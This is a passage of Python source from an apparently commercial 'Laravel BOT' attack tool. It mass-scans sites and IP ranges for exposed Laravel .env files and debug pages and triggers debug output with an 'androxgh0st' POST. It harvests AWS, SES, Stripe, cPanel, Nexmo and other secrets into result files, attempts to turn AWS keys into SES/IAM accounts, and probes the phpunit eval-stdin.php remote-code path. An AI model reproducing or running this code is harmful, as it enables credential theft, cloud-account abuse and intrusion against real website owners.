      save = open('result/NEXMO.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
      try:
        nexmosend(url,nexmo_key,nexmo_secret)
      except:
        print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mINVALI NEXMO\n".format(str(url)))
    elif 'NEXMO_KEY' not in text or 'NEXMO_KEY' in text and NEXMO() == "off":
      pass
    else:
      print("\033[1;40m[BY XCATZE] {} |   \033[1;31;40mFailed NEXMO\n".format(str(url)))


    if '<td>AWS_ACCESS_KEY_ID</td>' in text:
      aws_kid = reg('<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_sky = reg('<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_reg = reg('<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nAWS_KEY: '+str(aws_kid)+'\nAWS_SECRET: '+str(aws_sky)+'\nAWS_REGION: '+str(aws_reg)
      remover = str(build).replace('\r', '')
      build2 = str(aws_kid)+'|'+str(aws_sky)+'|'+str(aws_reg)
      if str(mailuser) != "" and  str(mailport) !="":
        save = open('result/'+aws_reg+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n')
        save3.close()
        try:
          autocreateses(url,aws_kid,aws_sky,aws_reg)
        except:
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    elif '<td>AWS_KEY</td>' in text:
      aws_kid = reg('<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_sky = reg('<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_reg = reg('<td>AWS_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nAWS_KEY: '+str(aws_kid)+'\nAWS_SECRET: '+str(aws_sky)+'\nAWS_REGION: '+str(aws_reg)
      remover = str(build).replace('\r', '')
      build2 = str(aws_kid)+'|'+str(aws_sky)+'|'+str(aws_reg)
      if str(mailuser) != "" and  str(mailport) !="":
        save = open('result/'+aws_reg+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n')
        save3.close()
        try:
          autocreateses(url,aws_kid,aws_sky,aws_reg)
        except:
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    elif '<td>AWSAPP_KEY</td>' in text:
      aws_kid = reg('<td>AWSAPP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_sky = reg('<td>AWSAPP_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_reg = reg('<td>AWSAPP_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nAWSAPP_KEY: '+str(aws_kid)+'\nAWSAPP_SECRET: '+str(aws_sky)+'\nAWSAPP_REGION: '+str(aws_reg)
      remover = str(build).replace('\r', '')
      build2 = str(aws_kid)+'|'+str(aws_sky)+'|'+str(aws_reg)
      if str(mailuser) != "" and  str(mailport) !="":
        save = open('result/'+aws_reg+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/aws_secret_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        save3 = open('result/aws_secret_key_for_checker.txt', 'a')
        save3.write(build2+'\n')
        save3.close()
        try:
          autocreateses(url,aws_kid,aws_sky,aws_reg)
        except:
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    elif '<td>SES_KEY</td>' in text:
      aws_kid = reg('<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_sky = reg('<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      aws_reg = reg('<td>SES_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nSES_KEY: '+str(aws_kid)+'\nSES_SECRET: '+str(aws_sky)+'\nSES_REGION: '+str(aws_reg)
      remover = str(build).replace('\r', '')
      if str(mailuser) != "" and  str(mailport) !="":
        save = open('result/'+aws_reg+'.txt', 'a')
        save.write(remover+'\n\n')
        save.close()
        save2 = open('result/ses_key.txt', 'a')
        save2.write(remover+'\n\n')
        save2.close()
        try:
          autocreateses(url,aws_kid,aws_sky,aws_reg)
        except:
          print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mCANT CRACK AWS KEY\n".format(str(url)))
    
    if '<td>MAILER_DSN</td>' in text:
      aws_kid = reg('<td>MAILER_DSN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      build = 'URL: '+str(url)+'\nMAILER_DSN: '+str(aws_kid)
      remover = str(build).replace('\r', '')
      if str(aws_kid) != "" and  str(aws_kid) !="smtp://localhost":
        save = open('result/symfony_mailer_dsn.txt', 'a')
        save.write(remover+'\n\n')
        save.close()

    if '<td>EXOTEL_API_KEY</td>' in text and EXOTEL() == "on":
      try:
        exotel_api = reg('<td>EXOTEL_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        exotel_api = ''
      try:
        exotel_token = reg('<td>EXOTEL_API_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        exotel_token = ''
      try:
        exotel_sid = reg('<td>EXOTEL_API_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        exotel_sid = ''
      print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mEXOTEL\n".format(str(url)))
      build = 'URL: '+str(url)+'\nEXOTEL_API_KEY: '+str(exotel_api)+'\nEXOTEL_API_TOKEN: '+str(exotel_token)+'\nEXOTEL_API_SID: '+str(exotel_sid)
      remover = str(build).replace('\r', '')
      save = open('result/EXOTEL.txt', 'a')
      save.write(remover+'\n\n')
      save.close()


    if '<td>ONESIGNAL_APP_ID</td>' in text and ONESIGNAL() == "on":
      try:
        onesignal_id = reg('<td>ONESIGNAL_APP_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        onesignal_id = ''
      try:
        onesignal_token = reg('<td>ONESIGNAL_REST_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        onesignal_token = ''
      try:
        onesignal_auth = reg('<td>ONESIGNAL_USER_AUTH_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        onesignal_auth = ''
      print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mONESIGNAL\n".format(str(url)))
      build = 'URL: '+str(url)+'\nONESIGNAL_APP_ID: '+str(onesignal_id)+'\nONESIGNAL_REST_API_KEY: '+str(onesignal_token)+'\nONESIGNAL_USER_AUTH_KEY: '+str(onesignal_auth)
      remover = str(build).replace('\r', '')
      save = open('result/ONESIGNAL.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

    if '<td>TOKBOX_KEY_DEV</td>' in text and TOKBOX() == "on":
      try:
        tokbox_key = reg('<td>TOKBOX_KEY_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        tokbox_key = ''
      try:
        tokbox_secret = reg('<td>TOKBOX_SECRET_DEV<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        tokbox_secret = ''
      print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mTOKBOX\n".format(str(url)))
      build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
      remover = str(build).replace('\r', '')
      save = open('result/TOKBOX.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
    elif '<td>TOKBOX_KEY</td>' in text:
      try:
        tokbox_key = reg('<td>TOKBOX_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        tokbox_key = ''
      try:
        tokbox_secret = reg('<td>TOKBOX_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        tokbox_secret = ''
      print("\033[1;40m[BY XCATZE] {} |   \033[1;32;40mTOKBOX\n".format(str(url)))
      build = 'URL: '+str(url)+'\nTOKBOX_KEY_DEV: '+str(tokbox_key)+'\nTOKBOX_SECRET_DEV: '+str(tokbox_secret)
      remover = str(build).replace('\r', '')
      save = open('result/TOKBOX.txt', 'a')
      save.write(remover+'\n\n')
      save.close()
    
    if '<td>CPANEL_HOST</td>' in text:
      method = 'debug'
      try:
        cipanel_host = reg('<td>CPANEL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        cipanel_host = ''
      try:
        cipanel_port = reg('<td>CPANEL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        cipanel_port = ''
      try:
        cipanel_user = reg('<td>CPANEL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        cipanel_user = ''
      try:
        cipanel_pw = reg('<td>CPANEL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
      except:
        cipanel_pw = ''
      build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nCPANEL_HOST: '+str(cipanel_host)+'\nCPANEL_PORT: '+str(cipanel_port)+'\nCPANEL_USERNAME: '+str(cipanel_user)+'\nCPANEL_PASSWORD: '+str(cipanel_pw)
      remover = str(build).replace('\r', '')
      save = open('result/CPANEL.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

    if "<td>STRIPE_KEY</td>" in text:
      method = 'debug'
      try:
        stripe_1 = reg("<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
      except:
        stripe_1 = ''
      try:
        stripe_2 = reg("<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
      except:
        stripe_2 = ''
      build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSTRIPE_KEY: '+str(stripe_1)+'\nSTRIPE_SECRET: '+str(stripe_2)
      remover = str(build).replace('\r', '')
      save = open('Result/STRIPE_KEY.txt', 'a')
      save.write(remover+'\n\n')
      save.close()

  except Exception as e:
    pass


def di_chckngntd(url):
  try:
    text = '\033[32;1m#\033[0m'+url
    headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
    get_source = requests.get(url+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False).text
    exp = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
    if "APP_KEY=" in str(get_source):
      get_smtp(url+"/.env",str(get_source))
    else:
      get_source3 = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=5, verify=False, allow_redirects=False).text
      if "<td>APP_KEY</td>" in get_source3:
        get_smtp2(url,get_source3)
      elif "https" not in url and "APP_KEY=" not in str(get_source):
        nurl = url.replace('http','https')
        get_source2 = requests.get(nurl+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False).text
        if "APP_KEY=" in str(get_source2):
          get_smtp(nurl+"/.env",str(get_source2))
        else:
          get_source4 = requests.post(nurl, data={"0x[]":"androxgh0st"}, headers=headers, timeout=5, verify=False, allow_redirects=False).text
          if "<td>APP_KEY</td>" in get_source4:
            get_smtp2(nurl,get_source4)
          else:
            print("\033[1;40m[BY XCATZE] {} |  \033[1;31;40mNOT VULN WITH HTTPS".format(str(url)))
      else:
          print("\033[1;40m[BY XCATZE] {} |  \033[1;31;40mNOT VULN".format(str(url)))
    
    if phpunitshell() == "on":
      newurl = url+exp
      exploit(newurl)
      
  except Exception as e:
    pass

def di_chckngntd4(url):
  for pet in pathline:
    try:
      text = '\033[32;1m#\033[0m'+url
      headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
      get_source = requests.get(url+str(pet), headers=headers, timeout=5, verify=False, allow_redirects=False).text
      newurl = url+str(pet)
      print('\033[1;40m#\033[0m Start Check '+newurl)
      if "APP_KEY=" in str(get_source):
        get_smtp(newurl,str(get_source))
        break
      else:
        print("\033[1;40m[BY XCATZE] {} |  \033[1;31;40mNOT VULN".format(str(url)))
    except Exception as e:
      pass

  get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
  if "<td>APP_KEY</td>" in get_source:
    get_smtp2(url,get_source)
  else:
   print("\033[1;40m[BY XCATZE] {} |  \033[1;31;40mNOT VULN".format(str(url)))





def checkset():

  AWS_ACCESS_KEYx=AWS_ACCESS_KEY()
  AWS_KEYx=AWS_KEY()
  twilliox=twillio()
  awsx=aws()
  sparkpostmailx = sparkpostmail()
  and1x = and1()
  mandrillappx = mandrillapp()
  zohox = zoho()
  sendgridx = sendgrid()
  office365x = office365()
  mailgunx = mailgun()
  NEXMOx=NEXMO()
  EXOTELx=EXOTEL()
  ONESIGNALx=ONESIGNAL()
  TOKBOXx=TOKBOX()
  print("amazonaws:"+awsx+"|twillio:"+twilliox+"|AWS_KEY:"+AWS_KEYx+"|AWS_ACCESS_KEY:"+AWS_ACCESS_KEYx+"|sparkpostmail:"+sparkpostmailx+"\n1and1:"+and1x+"|mandrillapp:"+mandrillappx+"|zoho:"+zohox+"|sendgrid:"+sendgridx+"|office365:"+office365x+"|mailgun:"+mailgunx+"\n|NEXMO:"+NEXMOx+"|EXOTEL:"+EXOTELx+"|ONESIGNAL:"+ONESIGNALx+"|TOKBOX:"+TOKBOXx)

def logo():
    clear = "\x1b[0m"

    x = """
 
██╗░░██╗░█████╗░░█████╗░████████╗███████╗███████╗
╚██╗██╔╝██╔══██╗██╔══██╗╚══██╔══╝╚════██║██╔════╝
░╚███╔╝░██║░░╚═╝███████║░░░██║░░░░░███╔═╝█████╗░░
░██╔██╗░██║░░██╗██╔══██║░░░██║░░░██╔══╝░░██╔══╝░░
██╔╝╚██╗╚█████╔╝██║░░██║░░░██║░░░███████╗███████╗
╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚══════╝╚══════╝

TOOLS   : Laravel BOT           Paid Tools
VERSION : PRO              FACEBOOK : fb.me/
SHOP    : shoppy.gg/@      TELEGRAM GROUP : t.me/Flash_X_Tools

Never buy tools other than via tele / shop above

 \033[92mFeatures:
 \033[1;40m- Auto Send Valid Smtp to your email
 \033[1;40m- Auto Crack IM USER/SES from AWS
 \033[1;40m- Auto Check Valid twillio (Balance, Send Status)
 \033[1;40m- Auto Check Valid Nexmo (Balance)
 \033[1;40m- Auto Reverse IP
 \033[1;40m- Auto Laravel shell
 \033[1;40m- Free Tutorial Grab IP & Request feature

  
\033[92mPrice : \033[1;40m$100 lifetime & free update
"""
    print (x)
    
logo()

def menucit():
  sdx = """
 \033[1;37;40m[1]  Grab .env + Debug                        \033[1;37;40m[7]  DORK/KEYWORD + Option 2
 \033[1;37;40m[2]  Grab .env + Debug (Auto Scan)            \033[1;37;40m[8]  MASS IP RANGE SCAN + Option 2
 \033[1;37;40m[3]  Option 2 + Auto reverse ip               \033[1;37;40m[9]  MASS IP RANGE SCAN + Option 3
 \033[1;37;40m[4]  Option 2 + Multiple path [with path.ini] \033[1;37;40m[10]  Remove duplicate list
 \033[1;37;40m[5]  Website To IP + Option 3                 \033[1;37;40m[11]  Check Limit Aws Key
 \033[1;37;40m[6]  Website To IP Only                       \033[1;37;40m[12]  Crack AWS Key List Format(awskey|secretkey|region)
 """
  print (sdx)

def jembotngw(sites):
  if 'http' not in sites:
    site = 'http://'+sites

    prepare(site)
  else:
    prepare(sites)





def jembotngw2(sites):


  if 'http' not in sites:
    site = 'http://'+sites

    di_chckngntd(site)
  else:
    di_chckngntd(sites)

def prepare2(sites):

  di_chckngntd(sites)


def jembotngw4(sites):

  if 'http' not in sites:
    site = 'http://'+sites

    di_chckngntd4(site)
  else:
    di_chckngntd4(sites)





def nowayngntd():

  Targetssa = input("\033[1;37;40mInput Your List : ") #for date
  ip_list = open(Targetssa, 'r').read().split('\n')
  for sites in ip_list:
    if 'http' not in sites:
      site = 'http://'+sites

      prepare(site)
    else:
      prepare(sites)

def makethread(jumlah):
  try:
    nam = input("\033[1;37;40mInput Your List : ") #for date
    th = int(jumlah)
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
    zm.map(jembotngw, liss)
    zm.close()
    zm.join()
  except Exception as e:
    pass

def makethread3(jumlah):
  try:
    nam = input("\033[1;37;40mInput Your List : ") #for date
    th = int(jumlah)
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
    zm.map(dorkscan, liss)
    zm.close()
    zm.join()
  except Exception as e:
    pass

def makethread4(jumlah):
  try:
    nam = input("\033[1;37;40mInput Your List : ") #for date
    th = int(jumlah)
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
    zm.map(jembotngw4, liss)
    zm.close()
    zm.join()
  except Exception as e:
    pass

def makethread5():
  file_location = input("\033[1;37;40mInput Your List : ") #for date
  opened_file = open(file_location, ).readlines()
  fresh_lines_sites = [items.rstrip() for items in opened_file]
  sites_len = len(fresh_lines_sites)
  rotation = 0
  for lines in fresh_lines_sites:
      rotation += 1
      ip_grabberautoscan(lines,sites_len,rotation)
  

def makethread6():
  file_location = input("\033[1;37;40mInput Your List : ") #for date
  opened_file = open(file_location, ).readlines()
  fresh_lines_sites = [items.rstrip() for items in opened_file]
  sites_len = len(fresh_lines_sites)
  rotation = 0
  for lines in fresh_lines_sites:
      ip_grabber(lines,sites_len,rotation)

def makethread8():
    ipstart = input("\033[1;37;40mstart ip : ") #for date
    ip1 = ipstart.strip().split('.')
    ipto = input("\033[1;37;40mto ip : ") #for date
    ip2 = ipto.strip().split('.')
    cur = ipstart.strip().split('.')

    rip0 =int(ip1[0])
    rip1 =int(ip1[1])
    rip2 =int(ip1[2])
    rip3 =int(ip1[3])-1
    finalip = 0
    while finalip != ipto:
      rip3 +=1
      finalip = str(rip0)+"."+str(rip1)+"."+str(rip2)+"."+str(rip3)
      jembotngw2(finalip)
      if rip2 != int(ip2[2])+1 and rip3 == int(ip2[3]):
        rip2 +=1
        rip3 = int(ip1[3]) - 1
      elif rip1 != int(ip2[1]) and rip2 == int(ip2[2]):
        rip1 +=1
        rip2 = int(ip1[2])
        rip3 = int(ip1[3]) - 1
      elif rip0 != int(ip2[0]) and rip1 == int(ip2[1]):
        rip0 +=1
        rip1 =int(ip1[1])
        rip2 = int(ip1[2])
        rip3 = int(ip1[3]) - 1

def makethread9():
    ipstart = input("\033[1;37;40mstart ip : ") #for date
    ip1 = ipstart.strip().split('.')
    ipto = input("\033[1;37;40mto ip : ") #for date
    ip2 = ipto.strip().split('.')
    cur = ipstart.strip().split('.')

    rip0 =int(ip1[0])
    rip1 =int(ip1[1])
    rip2 =int(ip1[2])
    rip3 =int(ip1[3])-1
    finalip = 0
    while finalip != ipto:
      rip3 +=1
      finalip = str(rip0)+"."+str(rip1)+"."+str(rip2)+"."+str(rip3)
      dorkscan(finalip)
      if rip2 != int(ip2[2])+1 and rip3 == int(ip2[3]):
        rip2 +=1
        rip3 = int(ip1[3]) - 1
      elif rip1 != int(ip2[1]) and rip2 == int(ip2[2]):
        rip1 +=1
        rip2 = int(ip1[2])
        rip3 = int(ip1[3]) - 1
      elif rip0 != int(ip2[0]) and rip1 == int(ip2[1]):
        rip0 +=1
        rip1 =int(ip1[1])
        rip2 = int(ip1[2])
        rip3 = int(ip1[3]) - 1

def nowayngntd2():

  Targetssa = input("\033[1;37;40mInput Your List : ") #for date
  ip_list = open(Targetssa, 'r').read().split('\n')
  for sites in ip_list:
    if 'http' not in sites:
      site = 'http://'+sites

      prepare2(site)
    else:
      prepare2(sites)



def makethread2(jumlah):
  try:
    nam = input("\033[1;37;40mInput Your List : ") #for date
    th = int(jumlah)
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
    zm.map(jembotngw2, liss)
  except Exception as e:
    pass
def cracksespisah():
  nam = input("\033[1;37;40mInput AWS KEY List : ") #for date
  lista = open(nam, 'r').read().split('\n')
  totalnum = len(lista)
  print('[X] Threads Number  : ' , end='')

  threadnum = int(input())

  threads = []

  for i in lista:
    try:
        ACCESS_KEY,SECRET_KEY,REGION = i.split('|')
        thread = threading.Thread(target=autocreate , args=(ACCESS_KEY.strip(),SECRET_KEY.strip(),REGION.strip()))
        threads.append(thread)
        thread.start()
        if len(threads) == threadnum:
            for i in threads:
                i.join()
                threads = []
    except:
        continue

def cinxx():
  try:
    menucit()
    Targetssad = input("\033[1;37;40mChoice : ") #for date
    if Targetssad == "1":

      Targetssas = input("\033[1;37;40mWith thread or no [y/n] : ") #for date
      if Targetssas == "y":
        jumlahkn = input("\033[1;37;40mThread : ") #for date
        makethread(jumlahkn)
      else:
        nowayngntd()
    elif Targetssad == "3":
      Targetssas = input("\033[1;37;40mWith thread or no [y/n] : ") #for date
      if Targetssas == "y":
        jumlahkn = input("\033[1;37;40mThread : ") #for date
        makethread3(jumlahkn)
      else:
        makethread3(1)
    elif Targetssad == "4":
      Targetssas = input("\033[1;37;40mWith thread or no [y/n] : ") #for date
      if Targetssas == "y":
        jumlahkn = input("\033[1;37;40mThread : ") #for date
        makethread4(jumlahkn)
      else:
        makethread4(1)
    elif Targetssad == "5":
      makethread5()
      
    elif Targetssad == "6":
      makethread6()
    elif Targetssad == "7":
      autodork()
    elif Targetssad == "8":
      makethread8()
    elif Targetssad == "9":
      makethread9()
    elif Targetssad == "10":
      clean()
    elif Targetssad == "11":
      awskey = input("AWS KEY : ") #for date
      seckey = input("SECRET KEY : ") #for date
      reg = input("REGION : ") #for date
      awslimitcheck(awskey,seckey,reg)
    elif Targetssad == "12":
      cracksespisah()
    elif Targetssad == "2":
      Targetssas = input("\033[1;37;40mWith thread or no [y/n] : ") #for date
      if Targetssas == "y":
        jumlahkn = input("\033[1;37;40mThread : ") #for date
        makethread2(jumlahkn)
      else:
        nowayngntd2()
    else:
      if os.name == "nt":
        os.system("cls")
      else:
        os.system("clear")
      logo()
      cinxx()

  except KeyboardInterrupt as e:
    print("Exit Program")
    sys.exit()

cinxx()